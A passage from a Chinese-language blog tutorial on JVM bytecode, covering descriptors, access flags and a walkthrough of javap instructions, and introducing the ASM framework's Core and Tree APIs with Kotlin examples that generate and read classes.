src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg\" alt=\"image-20220223192518999\"></p>\n<p>构造器的标识符为<code>()V</code>，即一个无形参，返回值为void类型的方法。</p>\n<p>再举几个例子:</p>\n<blockquote>\n<p>public Set<ArathothAttribute> getAttrInstSet()</p>\n<p>()Ljava&#x2F;util&#x2F;Set&lt;ink&#x2F;rainbowbridge&#x2F;v1&#x2F;arathoth&#x2F;attribute&#x2F;abstracts&#x2F;ArathothAttribute;&gt;;</p>\n<p>如你所见，泛型并不会在编译时被擦除，只会在运行时</p>\n<p>所以我们可以在运行时通过草字节码的方式获得一个已经被擦除的泛型</p>\n</blockquote>\n<blockquote>\n<p>public Double getRandom(Double value1, Double value2)</p>\n<p>(Ljava&#x2F;lang&#x2F;Double;Ljava&#x2F;lang&#x2F;Double;)Ljava&#x2F;lang&#x2F;Double;</p>\n<p>装箱后的基础类型实际上是类</p>\n<p>提点题外话</p>\n<p>public double sum(Double value1, double value2) {</p>\n<p>​\t\treturn value1 + value2;</p>\n<p>}</p>\n<p>你们觉得它编译出来字节码会怎么样:), 实际上字节码调用了value1的doubleValue()方法得到了未装箱的值，再进行相加。</p>\n<p>反之亦然，java有自动装箱和自动拆箱的特性。</p>\n</blockquote>\n<blockquote>\n<p>那么数组会如何呢</p>\n<p>public double[] getRandomNums()</p>\n<p>()[D</p>\n<p>当然是在前面加个[</p>\n</blockquote>\n<h4 id=\"访问标志\"><a href=\"#访问标志\" class=\"headerlink\" title=\"访问标志\"></a>访问标志</h4><p>即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从字面上应该就能猜出这些访问标志的意思，它们用来描述一个类&#x2F;方法&#x2F;字段的各种修饰符。</p>\n<p>类的标志类型:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg\" alt=\"image-20220223200619811\"></p>\n<p>字段的标志类型:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg\" alt=\"image-20220223201053780\"></p>\n<p>方法的标志类型:</p>\n<table>\n<thead>\n<tr>\n<th>标志名称</th>\n<th>标志值</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ACC_PUBLIC</td>\n<td>0x0001</td>\n<td>方法是否为public</td>\n</tr>\n<tr>\n<td>ACC_PRIVATE</td>\n<td>0x0002</td>\n<td>方法是否为private</td>\n</tr>\n<tr>\n<td>ACC_PROTECTED</td>\n<td>0x0004</td>\n<td>方法是否为protected</td>\n</tr>\n<tr>\n<td>ACC_STATIC</td>\n<td>0x0008</td>\n<td>方法是否为static</td>\n</tr>\n<tr>\n<td>ACC_FINAL</td>\n<td>0x0010</td>\n<td>方法是否为final</td>\n</tr>\n<tr>\n<td>ACC_SYNCHRONIZED</td>\n<td>0x0020</td>\n<td>方法是否为synchronized</td>\n</tr>\n<tr>\n<td>ACC_BRIDGE</td>\n<td>0x0040</td>\n<td>方法是不是由编译器产生的桥接方法</td>\n</tr>\n<tr>\n<td>ACC_VARARGS</td>\n<td>0x0080</td>\n<td>方法是否接受不定参数</td>\n</tr>\n<tr>\n<td>ACC_NATIVE</td>\n<td>0x0100</td>\n<td>方法是否为native</td>\n</tr>\n<tr>\n<td>ACC_ABSTRACT</td>\n<td>0x0400</td>\n<td>方法是否为abstract</td>\n</tr>\n<tr>\n<td>ACC_STRICT</td>\n<td>0x0800</td>\n<td>方法是否为strictfp</td>\n</tr>\n<tr>\n<td>ACC_SYNTHETIC</td>\n<td>0x1000</td>\n<td>方法是否由编译器自动产生</td>\n</tr>\n</tbody></table>\n<h4 id=\"字节码指令\"><a href=\"#字节码指令\" class=\"headerlink\" title=\"字节码指令\"></a>字节码指令</h4><blockquote>\n<p>我觉得字节码要细讲完全可以再单开一篇讲，这里就稍微讲一点基础的，让待会ASM的时候不至于完全懵逼就行</p>\n</blockquote>\n<p>前面讲了这么多基本都是描述类和方法的信息，大家一定很好奇我们编写的程序逻辑到底放在哪里了吧。没错，我们编写的逻辑被编译成了面向操作<strong>操作数栈</strong>的字节码指令。为什么要说它是面向<strong>操作数栈</strong>的操作指令？接下来我会讲一讲main方法中所有字节码指令的作用，听完你们就知道了。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre><code>Code:\n  stack=3, locals=3, args_size=1\n     0: iconst_1\n     1: istore_1\n     2: iconst_2\n     3: iload_1\n     4: iadd\n     5: istore_2\n     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n     9: iload_1\n    10: iload_2\n    11: invokestatic  #3                  // Method sum:(II)I\n    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n    17: return\n</code></pre>\n<hr>\n<blockquote>\n<p>iconst_1</p>\n</blockquote>\n<p>将一个int类型的常量<code>1</code>加载到<strong>操作数栈</strong>, 此时操作数栈深度为1。对应<code>int a = 1</code>中1的初始化。</p>\n<blockquote>\n<p>istore_1</p>\n</blockquote>\n<p>将一个int类型的数值从<strong>操作数栈</strong>顶取出并存储到局部变量表，这个数值在操作数栈的位置为1，即我们刚才压进操作数栈的<code>1</code>，对应<code>int a = 1</code>中的赋值操作</p>\n<blockquote>\n<p>iconst_2</p>\n</blockquote>\n<p>将一个int类型的常量<code>2</code>加载到<strong>操作数栈</strong>，此时操作数栈深度为2。对应 <code>int b = 2 + a</code>中2的初始化</p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>将一个int类型的局部变量直接加载到<strong>操作数栈</strong>，这个局部变量在局部变量表的位置为1。即刚才第二条指令存进局部变量表的局部变量<code>a</code></p>\n<blockquote>\n<p>iadd</p>\n</blockquote>\n<p>将<strong>操作数栈</strong>顶的两个int类型的数值取出并相加，再压进<strong>操作数栈</strong>中，对应<code>int b = 2 + a</code>的加法运算</p>\n<blockquote>\n<p>istore_2</p>\n</blockquote>\n<p>将一个int类型的数值从<strong>操作数栈</strong>顶中取出并存储到局部变量表，这个数值在<strong>操作数栈</strong>的位置为2，对应<code>int b = 2 + a</code>的赋值</p>\n<blockquote>\n<p>getstatic     #2                  &#x2F;&#x2F; Field java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;</p>\n</blockquote>\n<p>获取静态域<code>System.out</code>, 类型为<code>Ljava/io/PrintStream</code>,并将其压入<strong>操作数栈</strong>顶。后面跟的<code>#2</code>在常量池中对应<code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>将int类型的局部变量<code>a</code>加载到<strong>操作数栈</strong>，待用</p>\n<blockquote>\n<p>iload_2</p>\n</blockquote>\n<p>将int类型的局部变量b加载到<strong>操作数栈</strong>，待用</p>\n<blockquote>\n<p>invokestatic  #3                  &#x2F;&#x2F; Method sum:(II)I</p>\n</blockquote>\n<p>执行所在类中的静态方法，传入栈顶的两个int数值作为形参，返回一个int类型的值压入栈顶</p>\n<blockquote>\n<p>invokevirtual #4                  &#x2F;&#x2F; Method java&#x2F;io&#x2F;PrintStream.println:(I)V</p>\n</blockquote>\n<p>执行<code>PrintStream#println</code>方法，传入栈顶元素作为参数，再传入下一个栈顶元素作为receiver（不知道java这个叫什么，反正kotlin有receiver这个概念）</p>\n<blockquote>\n<p>return</p>\n</blockquote>\n<p>返回void</p>\n<hr>\n<p>经过上面的分析我们已经大致知道了某些字节码的功能，你肯定也发现了，很大一部分字节码的功能是基于<strong>操作数栈</strong>实现的。</p>\n<p>特别是基于栈的数学运算，挺有意思的，我记得我们上学期有一次红岩作业就是实现一个逻辑运算，当时去网上看了一下，要用逆波兰表达式的解析方式配合栈来实现，这应该也是jvm数学运算的实现方式吧，有兴趣可以再写一遍。</p>\n<p>这里我就不系统性的讲解字节码指令了，太多了，根本讲不完。但你们可以课下去了解，我一般是遇见不认识的然后再去查:)</p>\n<h3 id=\"ASM框架\"><a href=\"#ASM框架\" class=\"headerlink\" title=\"ASM框架\"></a>ASM框架</h3><p>前面我们学习了字节码的基本结构以及部分字节码指令，我们一般使用ASM&#x2F;Javassist&#x2F;cglib等字节码操控框架来动态的修改&#x2F;生成字节码。那么通过它们我们能做到什么事情呢?</p>\n<ul>\n<li>编译期代码生成&#x2F;替换 ，一般通过gradle插件干预编译实现（例如著名的gradle插件shadowJar的依赖包重定向(relocate)功能)。字节码插桩也是在这个过程进行。</li>\n<li>运行期动态代理，可以做到一些InvocationHandler做不到的事情，例如修改类中包引用的包名。</li>\n<li>在获取一些类的信息时，使用asm读取字节码比反射要快得多。</li>\n<li>使用jvm一些奇奇怪怪的特性，例如<a href=\"https://github.com/MeiVinEight/ReflectionFX\">MeiVinEight&#x2F;ReflectionFX: Reflection Toolkit (github.com)</a>，该项目利用字节码的一些乱七八糟的特性实现了性能开销更小的反射，其性能甚至能够与操作MethodHandle持平。</li>\n</ul>\n<p>其实应该还有很多，我就不列举了。</p>\n<p>这里可能有人有疑问，我们android不是编译成dex吗，那按照常规的方式操作字节码是可行的吗？答案是可行，因为我们字节码插桩的过程一般是</p>\n<p>这里我主要介绍asm框架，它是最流行，最直接的操作字节码的框架，jdk甚至内置了一份。如果从学习字节码的角度来看，asm无疑是最合适的选择。同时安卓中用得比较多的技术就是字节码插桩，所以我准备讲一讲如何用asm框架实现字节码插桩。</p>\n<h4 id=\"ASM-Core-API-amp-Tree-API\"><a href=\"#ASM-Core-API-amp-Tree-API\" class=\"headerlink\" title=\"ASM Core API &amp; Tree API\"></a>ASM Core API &amp; Tree API</h4><h5 id=\"Core-API\"><a href=\"#Core-API\" class=\"headerlink\" title=\"Core API\"></a>Core API</h5><p>ASM 是基于访问者模式设计的，访问者模式可以让ASM更好的操作某个Jar包&#x2F;class文件中的所有类&#x2F;字段&#x2F;方法。因此要学会ASM，首先必须要了解访问者模式。(我其实懵逼了很久) 如果你们以后有兴趣了解kapt&#x2F;ksp也会用到访问者模式。（实际上这俩很多时候是跟asm配合着用的, kapt&#x2F;ksp生成代码，asm对代码进行插桩调用）</p>\n<p><a href=\"https://www.runoob.com/design-pattern/visitor-pattern.html\">访问者模式 | 菜鸟教程 (runoob.com)</a></p>\n<p>现在我们来讲讲基础用法:</p>\n<p>ASM基于访问者模式，为我们提供了一套访问class文件中所有属性的API。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassVisitor</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> version<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> superName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//访问类字段时回调</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">FieldVisitor</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//访问类方法是回调</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MethodVisitor</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在使用ClassVisitor访问类时，一旦访问到其中的属性就会回调到对应的属性的访问方法。</p>\n<blockquote>\n<h6 id=\"1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\"><a href=\"#1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\" class=\"headerlink\" title=\"1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\"></a>1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>访问class的头信息</p>\n<p>version：class版本（编译级别）</p>\n<p>access： 访问标示</p>\n<p>name：类名称</p>\n<p>signature：class的签名，可能是null</p>\n<p>superName：超类名称</p>\n<p>interfaces：接口的名称</p>\n<h6 id=\"2：void-visitAnnotation-String-descriptor-boolean-visible\"><a href=\"#2：void-visitAnnotation-String-descriptor-boolean-visible\" class=\"headerlink\" title=\"2：void visitAnnotation(String descriptor, boolean visible)\"></a>2：void visitAnnotation(String descriptor, boolean visible)</h6><p>访问class的注解信息</p>\n<p>descriptor：描述信息</p>\n<p>visible：是否运行时可见</p>\n<h6 id=\"3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\"><a href=\"#3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\" class=\"headerlink\" title=\"3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\"></a>3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>访问class中字段的信息，返回一个FieldVisitor用于获取字段中更加详细的信息。</p>\n<p>name：字段个的名称</p>\n<p>descriptor：字段的描述</p>\n<p>value：该字段的初始值，文档上面说：</p>\n<p>该参数，其可以是零，如果字段不具有初始值，必须是一个<code>Integer</code>，一<code>Float</code>，一<code>Long</code>，一个<code>Double</code>或一个<code>String</code>（对于<code>int</code>，<code>float</code>，<code>long</code> 或<code>String</code>分别字段）。<em>此参数仅用于静态字段</em>。对于非静态字段，它的值被忽略，非静态字段必须通过构造函数或方法中的字节码指令进行初始化（但是不管我怎么试，结果都是null）。</p>\n<h6 id=\"4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\"><a href=\"#4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\" class=\"headerlink\" title=\"4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\"></a>4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>访问class中方法的信息，返回一个MethodVisitor用于获取方法中更加详细的信息。</p>\n<p>name：方法的名称</p>\n<p>descriptor：方法的描述</p>\n<p>signature：方法的签名</p>\n<p>exceptions：方法的异常名称</p>\n<h6 id=\"5：visitInnerClass-String-name-String-outerName-String-innerName-int-access\"><a href=\"#5：visitInnerClass-String-name-String-outerName-String-innerName-int-access\" class=\"headerlink\" title=\"5：visitInnerClass(String name, String outerName, String innerName, int access)\"></a>5：visitInnerClass(String name, String outerName, String innerName, int access)</h6><p>访问class中内部类的信息。这个内部类不一定是被访问类的成员（这里的意思是可能是一段方法中的<strong>匿名内部类</strong>，或者<strong>声明在一个方法中的类</strong>等等）。</p>\n<p>name：内部类的名称。例子<code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<p>outerName：内部类所在类的名称</p>\n<p>innerName：内部类的名称</p>\n<h6 id=\"6：visitOuterClass-String-owner-String-name-String-descriptor\"><a href=\"#6：visitOuterClass-String-owner-String-name-String-descriptor\" class=\"headerlink\" title=\"6：visitOuterClass(String owner, String name, String descriptor)\"></a>6：visitOuterClass(String owner, String name, String descriptor)</h6><p>访问该类的封闭类。仅当类具有封闭类时，才必须调用此方法。</p>\n<p>我自己试了一下，如果在一个方法中定义了一个class，或者定义个一个匿名内部类，这时通过visitInnerClass方法能够得到例如<code>com/hebaibai/example/demo/Aoo$1</code>或者<code>com/hebaibai/example/demo/Aoo$1XX</code>的类名称。这时通过使用</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">ClassReader classReader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassReader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com/hebaibai/example/demo/Aoo$1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DemoClassVisitor</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span><span class=\"token constant\">ASM7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span><span class=\"token constant\">SKIP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>复制</p>\n<p>可以得到持有内部类的类信息。</p>\n<p>owner：拥有该类的class名称</p>\n<p>name：包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null</p>\n<p>descriptor：描述</p>\n</blockquote>\n<p>ClassVisitor是一个抽象类，我们可以通过继承它来实现自己的ClassVisitor（MethodVistitor&#x2F;FieldVisitor同)。我们可以插入一段逻辑来获取我们要访问的类的信息，也可以通过改变方法的返回值来修改类的信息。</p>\n<p>当然我们也可以直接通过ClassWriter来生成一个类，手动调用它的各种visit方法来向生成的类来写入字节码，下面我们先简简单单写个HelloWorld。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>\n        V1_8<span class=\"token punctuation\">,</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_SUPER<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"org/example/asmlearn/ASMLearn_Test\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> mv <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_STATIC<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>RETURN<span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> byteArray <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classLoader <span class=\"token operator\">=</span> <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> clazz <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.example.asmlearn.ASMLearn_Test\"</span><span class=\"token punctuation\">,</span> byteArray<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> Array<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">arrayOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> MyClassLoader <span class=\"token operator\">:</span> <span class=\"token function\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> b<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">*</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里我们通过asm生成了一个<code>org/example/asmlearn/ASMLearn_Test</code>类，并在里面生成了一个main方法，加载到自定义的classLoader中，然后对它进行反射执行main方法。</p>\n<blockquote>\n<p> 顺便说下生成代码的事情，编译期生成常规代码其实不推荐使用asm，我们一般只在运行期动态生成代码才使用asm。因为asm写起来比较繁琐，运行期用它来生成代码其实是因为没有更好的办法了。编译期如果不是你想实现什么魔法的话一般不用来生成代码，生成代码可以了解一下kapt和ksp，编译期asm一般只是用来在已有的代码中进行插桩。</p>\n</blockquote>\n<h5 id=\"Tree-API\"><a href=\"#Tree-API\" class=\"headerlink\" title=\"Tree API\"></a>Tree API</h5><p>Tree API基于Core API实现，Tree API让我们不用再自定义Visitor，我们可以直接获取一个类的ClassNode，然后通过ClassNode直接获得里面所有的方法&#x2F;字段信息。</p>\n<p>那么我们要如何得到一个ClassNode呢？</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ClassNode <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">.</span><span class=\"token function\">inputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> classNode\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们可以发现，其实ClassNode就是一个封装过的ClassVisitor。它重写了ClassVisitor所有的访问方法，在访问时把访问到的信息存到类中，然后我们就可以直接从里面获取。<em><strong>有兴趣可以自己实现一下ClassNode，非常简单。</strong></em></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 获取所有方法信息</span>\n<span class=\"token keyword\">val</span> methods<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>MethodNode<span class=\"token operator\">></span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n<span class=\"token comment\">// 获取所有字段信息</span>\n<span class=\"token keyword\">val</span> fields<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>FieldNode<span class=\"token operator\">></span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>fields<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><p>接下来我会讲解一些asm框架的实战用例，大家有兴趣回去可以跟着敲一敲，都不难。</p>\n<p>推荐的参考资料<a href=\"https://www.bilibili.com/read/cv13433468\">Java 